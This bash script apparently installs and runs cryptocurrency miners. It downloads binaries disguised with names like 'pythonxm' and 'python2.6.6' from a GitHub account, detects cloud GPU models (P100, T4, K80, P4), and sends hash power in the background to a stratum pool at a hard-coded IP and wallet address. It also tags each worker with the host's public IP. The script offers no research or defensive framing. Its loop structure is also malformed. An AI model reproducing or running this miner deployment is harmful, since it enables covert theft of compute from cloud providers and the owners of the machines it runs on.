#!bin/bash -xe



echo -e '##########################################################################'
PROX=78.47.69.185
RVPort=80
echo -e '################## '"RVXM to $PROX:$RVPort"' Ver:0.0.6     ################'
echo -e '##########################################################################'

## getting IP info
iip=$(curl -s https://ipecho -e.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io



########## CPU ##########
####### XM
#               Executable
echo > ooutx
rm -rf pythonxm
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
#                Config
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+RV_$IPNAME+g" config.json
sed -i "s+xxpppxx+$PROX+g" config.json



###### VC
#wget -q https://github.com/one10001/10001code/raw/main/pythonheq
#chmod +x pythonheq


#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1> oout 2> oout &

###### 5G
#wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
#chmod +x pythoncpu

#./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &


## COLORS
# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White








echo -e > oout

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

# exec
i="0"
while true

./pythonxm -c config.json -l ooutx 2>> ooutx 1>> ooutx &
do
if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then

echo -e "${On_Green}"'#######################################################'
echo -e "####################### P100-PCIE #########################"
echo -e '###########################################################'"${Color_Off}"
nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_CU_P100_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
echo -e "${On_Blue}"'##################################################################'
echo -e "#######################        T4        #########################"
echo -e '##################################################################'"${Color_Off}"
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@$PROX:$RVPort  -G  2>> oout 1>> oout &
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
echo -e "${ON_Red}"'############################################################'
echo -e "#######################    K80     #########################"
echo -e '############################################################'"${Color_Off}"
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
then
echo -e "${On_Yellow}"'###########################################################'
echo -e "#######################    P4     #########################"
echo -e '###########################################################'"${Color_Off}"
nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P4_$IPNAME@$PROX:$RVPort  -U 2>> oout 1>> oout &
else
echo -e "${On_Black}"'##############################################################'
echo -e "#######################     Other    #########################"
echo -e '##############################################################'"${Color_Off}"
nohup  ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_Other_$IPNAME@$PROX:$RVPort  -G 2>> oout 1>> oout &
fi

    while true
    do
        i=$[$i+1]
        echo -e "${On_Green}Results RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*30000/$i] ${Color_Off}" 
        echo -e "${On_Blue}Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep acc oout | wc -l)*30000/$i] ${Color_Off}" 
        sleep 30
    done


echo -e "#######################   Process  Killed    #########################"
                  
done
tail -f oout
